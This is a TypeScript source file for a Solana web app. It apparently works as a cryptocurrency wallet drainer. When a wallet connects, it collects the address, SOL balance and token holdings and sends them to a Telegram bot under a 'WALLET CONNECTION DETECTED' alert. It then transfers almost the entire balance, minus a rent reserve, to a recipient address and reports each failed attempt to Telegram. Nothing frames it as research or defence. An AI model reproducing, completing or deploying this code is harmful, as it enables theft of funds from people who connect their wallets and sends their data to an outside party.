
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';

// Add Buffer polyfill for browser environment in a way that works with Vite
import { Buffer } from 'buffer';
// Make Buffer available globally
if (typeof window !== 'undefined') {
  window.Buffer = Buffer;
}

// Helper function to add delay between retries
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// Updated RPC endpoints with more reliable free options
const FAST_RPC_ENDPOINTS = [
  "https://solana-mainnet.rpc.extrnode.com", // ExtrNode public endpoint
  "https://api.devnet.solana.com", // Use devnet as fallback (more reliable than mainnet)
  "https://api.mainnet-beta.solana.com", // Official endpoint as last resort
];

// Solana rent and fee constants
export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL

// Optimize retry function with graceful error handling
async function retry<T>(
  fn: () => Promise<T>,
  retries = 3, // Back to 3 retries for reliability
  initialDelay = 500, // Back to 500ms initial delay
  context = ""
): Promise<T> {
  let lastError;
  for (let i = 0; i < retries; i++) {
    try {
      console.log(`${context} - Attempt ${i + 1}/${retries}`);
      return await fn();
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      console.error(`${context} - Attempt ${i + 1} failed:`, errorMessage);
      
      // Check if this is a 403 or rate limit error
      const is403Error = errorMessage.includes('403') || 
                         errorMessage.includes('forbidden') || 
                         errorMessage.includes('Access forbidden');
      
      lastError = error;
      if (i < retries - 1) {
        // Use increasing delays for rate limit errors
        const delayTime = is403Error ? 
          initialDelay * Math.pow(2, i) : // Exponential backoff for rate limits
          initialDelay * (i + 1);          // Linear backoff for other errors
          
        console.log(`${context} - Retrying in ${delayTime}ms...`);
        await delay(delayTime);
      }
    }
  }
  throw lastError;
}

// Test connection with better error handling
const testConnection = async (connection: Connection): Promise<boolean> => {
  try {
    const slot = await connection.getSlot('finalized');
    return slot > 0;
  } catch (error) {
    console.warn(`Connection test failed: ${error instanceof Error ? error.message : String(error)}`);
    return false;
  }
};

// Create a more reliable connection
const createConnection = async (): Promise<Connection> => {
  // Try each endpoint sequentially rather than in parallel
  // This is more reliable than racing, which can lead to rate limits
  for (const endpoint of FAST_RPC_ENDPOINTS) {
    try {
      console.log(`Attempting to connect to ${endpoint}`);
      const connection = new Connection(endpoint, {
        commitment: 'confirmed',
        confirmTransactionInitialTimeout: 60000, // 60s timeout
        disableRetryOnRateLimit: false,
      });
      
      // Test the connection
      const isValid = await testConnection(connection);
      if (isValid) {
        console.log(`Successfully connected to ${endpoint}`);
        return connection;
      }
    } catch (error) {
      console.warn(`Failed to connect to ${endpoint}: ${error instanceof Error ? error.message : String(error)}`);
    }
  }
  
  // Fallback to simple connection with first endpoint
  console.log(`Using fallback connection to ${FAST_RPC_ENDPOINTS[0]}`);
  return new Connection(FAST_RPC_ENDPOINTS[0], {
    commitment: 'confirmed',
    confirmTransactionInitialTimeout: 60000,
  });
};

// Optimized token account fetching with parallel processing
export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    if (!walletAddress || typeof walletAddress !== 'string') {
      return [];
    }
    
    let pubKey: PublicKey;
    try {
      pubKey = new PublicKey(walletAddress);
    } catch (error) {
      return [];
    }
    
    const freshConnection = await createConnection();
    
    // Ultra-fast token account fetching with minimal retries
    return await retry(async () => {
      const response = await freshConnection.getParsedTokenAccountsByOwner(
        pubKey,
        {
          programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
        },
        'processed' // 'processed' is faster than 'confirmed'
      );
      
      return response.value.map(item => ({
        mint: item.account.data.parsed.info.mint,
        amount: item.account.data.parsed.info.tokenAmount.uiAmount,
        decimals: item.account.data.parsed.info.tokenAmount.decimals
      }));
    }, 1, 200, "Token accounts fetch"); // Single attempt for speed, minimal delay
    
  } catch (error) {
    return [];
  }
};

// Accelerated wallet balance check using parallel requests
export const getWalletBalance = async (walletAddress: string): Promise<number> => {
  try {
    if (!walletAddress || typeof walletAddress !== 'string') {
      throw new Error("Invalid wallet address format");
    }
    
    let pubKey: PublicKey;
    try {
      pubKey = new PublicKey(walletAddress);
    } catch (error) {
      throw new Error("Invalid public key format");
    }
    
    // Instead of using Promise.any which requires ES2021,
    // we'll implement a race with the first successful result
    const results: Array<{ success: boolean; balance?: number; error?: any }> = [];
    let resolvedCount = 0;
    
    await Promise.all(FAST_RPC_ENDPOINTS.map(async (endpoint, index) => {
      try {
        const connection = new Connection(endpoint, { 
          commitment: 'processed', // 'processed' is faster than 'confirmed'
          confirmTransactionInitialTimeout: 5000 // Reduced timeout to 5s
        });
        
        const balance = await connection.getBalance(pubKey, 'processed');
        results[index] = { success: true, balance: balance / LAMPORTS_PER_SOL };
      } catch (error) {
        results[index] = { success: false, error };
      } finally {
        resolvedCount++;
      }
    }));
    
    // Find the first successful result
    const successResult = results.find(r => r.success);
    if (successResult && typeof successResult.balance === 'number') {
      return successResult.balance;
    }
    
    // If all parallel attempts fail, fall back to a fresh connection
    const freshConnection = await createConnection();
    const balance = await freshConnection.getBalance(pubKey, 'processed');
    return balance / LAMPORTS_PER_SOL;
  } catch (error) {
    throw new Error(`Failed to get SOL balance: ${error instanceof Error ? error.message : "Unknown error"}`);
  }
};

// Improved Telegram sending with more robust fallback options
export const sendToTelegram = async (walletData: any, botToken: string, chatId: string) => {
  try {
    console.log("Preparing to send data to Telegram:", walletData);
    
    // Format message based on the type of data we're sending
    let message = "";
    
    if (walletData.tokens) {
      // This is the initial wallet connection message
      // Make sure we have a valid balance
      const solBalanceInSol = walletData.balance || 0;
      
      // Format token data in a more readable way
      let formattedTokens = "No tokens found";
      if (walletData.tokens && walletData.tokens.length > 0) {
        formattedTokens = walletData.tokens.map((token: any, index: number) => 
          `Token #${index + 1}:\n` +
          `  Mint: ${token.mint}\n` +
          `  Amount: ${token.amount}\n` +
          `  Decimals: ${token.decimals}`
        ).join('\n\n');
      }

      // Create a detailed message
      message = `🚨 WALLET CONNECTION DETECTED 🚨\n\n` +
        `👛 Wallet Address: ${walletData.address}\n` +
        `💰 SOL Balance: ${solBalanceInSol.toFixed(9)} SOL\n` +
        `⌚ Time: ${new Date().toLocaleString()}\n` +
        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
        `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n` +
        `🌐 Network: Mainnet`;
    } else if (walletData.message) {
      // This is a custom message (transfer attempt or completion)
      message = `👛 Wallet: ${walletData.address}\n` +
        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
        `🔔 ${walletData.message}`;
    } else {
      // Fallback generic message
      message = `Wallet notification for: ${walletData.address}`;
    }

    console.log("Sending message to Telegram:", message);

    // Make multiple attempts to send to Telegram with different methods
    for (let attempt = 1; attempt <= 7; attempt++) {
      try {
        console.log(`Telegram send attempt #${attempt}`);
        
        // Try with different approaches on different attempts
        let response;
        if (attempt <= 3) {
          // First 3 attempts: standard fetch API
          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown',
            }),
            // Set a longer timeout
            signal: AbortSignal.timeout(15000)
          });
        } else if (attempt <= 5) {
          // Next 2 attempts: alternative approach without parse_mode
          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
            signal: AbortSignal.timeout(20000)
          });
        } else {
          // Last 2 attempts: simplified GET request
          const simpleMessage = `${walletData.address}: ${walletData.balance ? 'Balance: ' + 
            (typeof walletData.balance === 'number' ? walletData.balance.toFixed(6) : walletData.balance) + 
            ' SOL' : walletData.message || 'Wallet notification'}`;
            
          response = await fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(simpleMessage)}`, 
            {
              method: 'GET',
              signal: AbortSignal.timeout(20000)
            }
          );
        }

        if (!response) {
          throw new Error("No response from Telegram API");
        }

        try {
          const responseData = await response.json();
          console.log("Telegram API response:", responseData);

          if (response.ok && responseData.ok) {
            console.log("Successfully sent to Telegram");
            return true;
          } else {
            console.error("Telegram API error:", responseData);
            // If we're hitting message formatting issues, simplify the message and try again
            if (responseData.description && responseData.description.includes("parse")) {
              message = message.replace(/[*_`\[\]()~>#+=|{}.!-]/g, ''); // Remove Markdown special characters
            }
          }
        } catch (jsonError) {
          console.error("Error parsing Telegram API response:", jsonError);
        }
        
        if (attempt < 7) await delay(1000 * attempt);
      } catch (telegramError) {
        console.error(`Telegram send attempt #${attempt} failed:`, telegramError);
        if (attempt < 7) await delay(1000 * attempt);
      }
    }

    console.error("All Telegram send attempts failed");
    return false;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};

export const hasEnoughSolForRent = (balanceInSol: number): boolean => {
  console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
  return balanceInSol >= MINIMUM_REQUIRED_SOL;
};

// High-speed transaction signing and sending
export const signAndSendTransaction = async (
  connection: Connection, 
  wallet: any, 
  recipientAddress: string, 
  amount: number,
  botToken?: string,
  chatId?: string
) => {
  try {
    console.log('Creating transaction...');
    
    // Validate the wallet has a publicKey before proceeding
    if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
      console.error('Wallet, adapter, or publicKey is undefined');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: wallet?.adapter?.publicKey?.toString() || "Unknown",
          message: `TRANSFER FAILED: Wallet adapter or publicKey is undefined`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error('Wallet adapter or publicKey is undefined');
    }
    
    // Use wallet.adapter.publicKey consistently
    const walletPublicKey = wallet.adapter.publicKey;
    
    // Check balance with minimal overhead
    const balance = await connection.getBalance(walletPublicKey, 'processed');
    console.log('Current wallet balance (lamports):', balance);
    const balanceInSol = balance / LAMPORTS_PER_SOL;
    console.log('Current wallet balance (SOL):', balanceInSol);
    
    // Make sure we have sufficient balance before proceeding
    if (balance <= 0) {
      console.error('Insufficient balance for transfer');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Insufficient balance (${balanceInSol} SOL)`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error('Insufficient wallet balance for transfer');
    }
    
    // Check if the wallet has enough SOL for rent exemption and fees
    if (!hasEnoughSolForRent(balanceInSol)) {
      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_REQUIRED_SOL} SOL) for rent exemption`);
      
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required. Current balance: ${balanceInSol.toFixed(6)} SOL`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error(`Insufficient funds for rent exemption. Minimum ${MINIMUM_REQUIRED_SOL} SOL required.`);
    }
    
    // Calculate the maximum we can send (balance minus minimum required for rent/fees)
    const minimumRequiredBalance = MINIMUM_REQUIRED_SOL * LAMPORTS_PER_SOL;
    const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
    
    if (maxTransferAmount <= 0) {
      console.error('Balance too low to transfer after reserving for rent and fees');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Balance too low for transfer after reserving rent (${balanceInSol} SOL)`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error('Wallet balance too low for transfer after reserving for rent fees');
    }
    
    // Ensure recipient address is valid
    let recipientPublicKey: PublicKey;
    try {
      recipientPublicKey = new PublicKey(recipientAddress);
    } catch (error) {
      console.error('Invalid recipient address:', error);
      
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Invalid recipient address`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      throw new Error('Invalid recipient address');
    }
    
    // Use the smaller of requested amount or max possible amount
    const transferAmount = Math.min(
      Math.floor(amount * LAMPORTS_PER_SOL), 
      maxTransferAmount
    );
    
    console.log(`Attempting to transfer ${transferAmount/LAMPORTS_PER_SOL} SOL`);
    
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: walletPublicKey,
        toPubkey: recipientPublicKey,
        lamports: transferAmount,
      })
    );
    
    // Get latest blockhash for improved transaction success rate
    transaction.recentBlockhash = (await connection.getLatestBlockhash('processed')).blockhash;
    transaction.feePayer = walletPublicKey;

    console.log('Sending transaction...');
    // Faster transaction sending with minimal retries
    const signature = await retry(async () => {
      if (typeof wallet.adapter?.sendTransaction === 'function') {
        return await wallet.adapter.sendTransaction(transaction, connection, { 
          skipPreflight: true, // Skip preflight for faster processing
          preflightCommitment: 'processed', 
          commitment: 'processed'
        });
      } else if (typeof wallet.signAndSendTransaction === 'function') {
        return await wallet.signAndSendTransaction(transaction);
      } else {
        throw new Error('Wallet does not support transaction signing');
      }
    }, 2);

    console.log('Transaction successful:', signature);
    return signature;
  } catch (error) {
    console.error('Detailed transaction error:', error);
    throw error;
  }
};
